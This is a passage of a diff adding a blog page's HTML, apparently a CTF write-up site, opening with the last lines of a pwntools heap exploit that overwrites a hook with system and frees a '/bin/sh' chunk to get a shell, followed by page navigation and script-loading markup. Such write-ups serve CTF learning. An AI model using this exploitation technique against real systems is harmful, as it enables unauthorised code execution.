+#edit(0,p64(libc_base+one[2]))
+edit(0,&#39;/bin/sh\x00&#39;+p64(system))
+dele(0)
+
+
+#gdb.attach(p)
+p.interactive()</code></pre>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2021/05/24/MTCTF初赛/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            Newer
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2021/05/24/津门杯/" id="post_nav-older" class="next-content">
+            Older
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -1180,6 +997,10 @@ It will not impact the appearance and can give developers a lot of support :)
 <!-- Import prettify js  -->
 
     
+        
+            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
+        
+    
 
 
 
@@ -1192,6 +1013,11 @@ It will not impact the appearance and can give developers a lot of support :)
     });
 
     
+        
+            $(function() {
+                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+                prettyPrint();
+                })
         
     
     
